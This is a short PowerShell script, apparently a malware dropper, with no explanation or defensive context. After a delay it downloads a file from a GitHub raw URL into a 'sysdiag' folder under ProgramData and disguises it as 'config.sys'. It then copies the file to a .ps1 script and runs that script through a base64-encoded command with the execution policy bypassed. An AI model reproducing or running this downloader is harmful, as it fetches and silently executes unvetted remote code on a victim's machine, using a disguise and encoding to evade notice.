# UID = 2848516423

Start-Sleep 3
$dropUrl = "https://raw.githubusercontent.com/flocktrack/sysdiag-utils/main/config.sys"
$destPath = "C:\ProgramData\sysdiag\config.sys"
$execPath = "C:\ProgramData\sysdiag\config.ps1"

$folder = Split-Path $destPath
if (-not (Test-Path $folder)) {
    New-Item -Path $folder -ItemType Directory | Out-Null
}

Invoke-WebRequest -Uri $dropUrl -OutFile $destPath

Copy-Item -Path $destPath -Destination $execPath

$cmd = "powershell -ExecutionPolicy Bypass -File `"$execPath`""
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encodedCommand = [Convert]::ToBase64String($bytes)

powershell.exe -EncodedCommand $encodedCommand
